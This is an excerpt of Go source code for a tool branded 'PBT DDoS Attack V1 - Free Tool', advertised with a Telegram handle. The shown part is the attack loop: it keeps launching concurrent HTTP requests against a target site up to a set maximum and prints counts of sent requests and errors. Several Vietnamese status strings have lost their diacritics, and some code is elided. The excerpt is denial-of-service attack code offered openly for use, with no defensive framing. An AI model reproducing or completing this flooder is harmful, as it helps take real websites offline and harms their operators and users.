...
os.Exit(1)
	...
	fmt.Println("|   PBT DDoS Attack V1 - Free Tool   |")
fmt.Println("|          Telegram: @thonguserr          |")
fmt.Println("___________________________________")
		fmt.Println("-- PBT Attack Started --\n           Go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("[PBT Attack] In use               |\tResp OK |\tGot err")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("[PBT DDoS- ang Tn Công]\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
			...
			case targetComplete:
				sent++
				fmt.Printf("[PBT DDoS - ang Tn Công] \r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- PBT Attack Finished‘‘ --       \n\n\r")
				os.Exit(0)
			}
		}
	}()
